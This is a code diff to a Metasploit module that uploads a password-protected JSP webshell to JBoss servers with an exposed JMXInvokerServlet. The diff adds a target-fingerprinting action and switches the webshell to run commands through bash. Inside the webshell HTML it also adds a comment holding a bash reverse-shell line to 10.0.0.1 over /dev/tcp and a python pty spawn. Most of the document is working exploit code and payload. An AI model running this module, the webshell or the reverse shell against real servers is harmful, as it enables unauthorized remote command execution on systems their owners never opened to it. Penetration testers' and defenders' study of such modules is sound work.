@@ -13,15 +13,17 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Exploit::EXE
 
+
+
   def initialize(info = {})
     super(update_info(info,
       'Name'        => 'JBoss upload webshell via JMXInvokerServlet',
       'Description' => %q{
           This module can be used to execute a webshell on JBoss servers that have an
         exposed HTTPAdaptor's JMX Invoker exposed on the "JMXInvokerServlet". By invoking
-        the methods provided by jboss.admin:DeploymentFileRepository a webshell is deployed
+        the methods provided by jboss.admin:DeploymentFileRepository, a webshell is deployed
         to the target. The DeploymentFileRepository methods are only available on 
-        Jboss 4.x and 5.x.
+        Jboss 4.x and 5.x. This works even with SElinux in enforced mode or egress firewall :)
       },
       'Author'      => [
         'Patrick Hof', # Vulnerability discovery, analysis and PoC
@@ -41,10 +43,11 @@ class MetasploitModule < Msf::Auxiliary
       'Stance'      => Msf::Exploit::Stance::Aggressive,
       'Actions'       =>
         [ 
-          ['Deploy'],
-          ['Undeploy']
+          ['Info', {'Description' => 'Get JBoss version and OS type as marshalled Java object'}],
+          ['Deploy', {'Description' => 'Deploy the webshell to the target'}],
+          ['Undeploy', {'Description' => 'Remove the webshell from the target (mind APPBASE and JSP options!)'}]
         ],
-      'DefaultAction' => 'Deploy'))
+      'DefaultAction' => 'Info'))
 
       register_options(
         [
@@ -58,9 +61,10 @@ class MetasploitModule < Msf::Auxiliary
   end
 
 
+
   def run
 
-    # We use a already serialized stuff...
+    # Put some vars together...
     regex_webshell_app_base = datastore['APPBASE'] || Rex::Text.rand_text_alpha(14)
     regex_webshell_jsp_name = datastore['JSP'] || Rex::Text.rand_text_alpha(14)
     webshell_uri = "/#{regex_webshell_app_base}/#{regex_webshell_jsp_name}.jsp"
@@ -73,6 +77,20 @@ class MetasploitModule < Msf::Auxiliary
     }
 
     case action.name
+    when 'Info'
+      print_status('Information on target')
+      res_version = send_serialized_request('version')
+      res_osname = send_serialized_request('osname')
+      res_osarch = send_serialized_request('osarch')
+      if res_version.nil? || res_osname.nil? || res_osarch.nil?
+        print_error('This request didn\'t work...')
+      else
+	v = Marshal.dump(res_version.body)
+	print_status("#{v}")
+        print_status("Version: #{res_version.body}")
+        print_status("OS: #{res_osname.body}")
+        print_status("Arch: #{res_osarch.body}")
+      end
     when 'Deploy'
       print_status('Deploying webshell')
       print_status("Webshell password: #{webshellpw}")
@@ -87,6 +105,8 @@ class MetasploitModule < Msf::Auxiliary
 
   end
 
+
+
   def generate_webshell(webshellpw_param)
 
     webshell_script = <<-EOT
@@ -100,18 +120,23 @@ CMD: <INPUT TYPE="text" NAME="cmd">
 PASS: <INPUT TYPE="password" NAME="passwd">
 <INPUT TYPE="submit" VALUE="Send">
 </FORM>
+<!--
+   bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 &
+   python -c 'import pty; pty.spawn("/bin/bash")'
+   # Links:
+   # http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+   # http://netsec.ws/?p=337
+-->
 <pre>
 <%
 String password = "#{webshellpw_param}";
 String suppliedpw = request.getParameter("passwd");
-if (request.getParameter("cmd") != null) {
-  if (suppliedpw.equals(password)) {
+if ((request.getParameter("cmd") != null) && (suppliedpw.equals(password))) {
         String cmd = request.getParameter("cmd");
-        String output = "";
-        out.println("Command: " + cmd + "<BR>");
-        String s = null;
+        String[] cmd_ary = new String[] { "/bin/bash", "-c", cmd };
+        out.println("Command: " + cmd + "\\n");
         try {
-          Process p = Runtime.getRuntime().exec(cmd);
+          Process p = Runtime.getRuntime().exec(cmd_ary);
 	  OutputStream os = p.getOutputStream();
           InputStream in = p.getInputStream();
           DataInputStream dis = new DataInputStream(in);
@@ -121,16 +146,12 @@ if (request.getParameter("cmd") != null) {
                 disr = dis.readLine(); 
                 }
         }
-        catch(IOException e) {
-          e.printStackTrace();
+        catch(Throwable t) {
+          t.printStackTrace();
         }
-  }
-  else {
-    out.println("You don't belong here. Bugger off!<br>");
-  }
 }
 else {
-        out.println("No, this didn't work...<br>");
+        out.println("I kindly refuse to work with you. Bugger off!<br>");
 }
 %>
 </pre>
@@ -138,6 +159,7 @@ else {
 EOT
 
   end
+
 
 
   def send_serialized_request(operation , replace_params = {})
@@ -191,6 +213,8 @@ EOT
     res
   end
 
+
+
   def call_uri_mtimes(uri, num_attempts = 5, verb = nil, data = nil)
     # JBoss might need some time for the deployment. Try 5 times at most and
     # wait 5 seconds inbetween tries
@@ -233,52 +257,6 @@ EOT
   end
 
 
-  def auto_target
-    print_status('Attempting to automatically select a target')
-
-    plat = detect_platform
-    arch = detect_architecture
-
-    return nil unless arch && plat
-
-    # see if we have a match
-    targets.each { |t| return t if (t['Platform'] == plat) and (t['Arch'] == arch) }
-
-    # no matching target found
-    return nil
-  end
-
-  # Try to autodetect the target platform
-  def detect_platform
-    print_status('Attempting to automatically detect the platform')
-    res = send_serialized_request('osname')
-
-    if res.body =~ /(Linux|FreeBSD|Windows)/i
-      os = $1
-      if os =~ /Linux/i
-        return 'linux'
-      elsif os =~ /FreeBSD/i
-        return 'linux'
-      elsif os =~ /Windows/i
-        return 'win'
-      end
-    end
-    nil
-  end
-
-  # Try to autodetect the architecture
-  def detect_architecture
-    print_status('Attempting to automatically detect the architecture')
-    res = send_serialized_request('osarch')
-    if res.body =~ /(i386|x86)/i
-      arch = $1
-      if arch =~ /i386|x86/i
-        return ARCH_X86
-        # TODO, more
-      end
-    end
-    nil
-  end
 
   def build_get_version
     builder = Rex::Java::Serialization::Builder.new
@@ -308,6 +286,8 @@ EOT
     build_invocation(stream)
   end
 
+
+
   def build_get_os
     builder = Rex::Java::Serialization::Builder.new
 
@@ -336,6 +316,8 @@ EOT
     build_invocation(stream)
   end
 
+
+
   def build_get_arch
     builder = Rex::Java::Serialization::Builder.new
 
@@ -363,6 +345,8 @@ EOT
 
     build_invocation(stream)
   end
+
+
 
   def build_install_webshell(opts = {})
     war_name = "#{opts[:war_name]}.war"
@@ -433,6 +417,8 @@ EOT
     build_invocation_deploy(stream)
   end
 
+
+
   def build_delete_webshell_file(opts = {})
     dir = opts[:dir] || ''
     file = opts[:file] || ''
@@ -491,6 +477,8 @@ EOT
     build_invocation_deploy(stream)
   end
 
+
+
   def build_invocation(stream_argument)
     stream = Rex::Java::Serialization::Model::Stream.new
     stream.contents = []
@@ -527,6 +515,8 @@ EOT
 
     stream
   end
+
+
 
   def build_invocation_deploy(stream_argument)
     builder = Rex::Java::Serialization::Builder.new
@@ -575,6 +565,8 @@ EOT
     stream
   end
 
+
+
   def build_marshalled_invocation
     builder = Rex::Java::Serialization::Builder.new
     builder.new_object(
@@ -585,6 +577,8 @@ EOT
     )
   end
 
+
+
   def build_marshalled_value
     builder = Rex::Java::Serialization::Builder.new
     builder.new_object(
@@ -594,6 +588,8 @@ EOT
       annotations: [Rex::Java::Serialization::Model::EndBlockData.new]
     )
   end
+
+
 
   def build_invocation_key(ordinal)
     builder = Rex::Java::Serialization::Builder.new
@@ -610,6 +606,8 @@ EOT
     )
   end
 
+
+
   def build_invocation_type(ordinal)
     builder = Rex::Java::Serialization::Builder.new
     builder.new_object(
@@ -624,6 +622,8 @@ EOT
       ]
     )
   end
+
+
 
   def build_integer(value)
     builder = Rex::Java::Serialization::Builder.new
@@ -645,6 +645,8 @@ EOT
     )
   end
 
+
+
   def build_null_stream
     stream = Rex::Java::Serialization::Model::Stream.new
     stream.contents = [Rex::Java::Serialization::Model::NullReference.new]
@@ -652,4 +654,7 @@ EOT
     stream
   end
 
+
+
 end
+
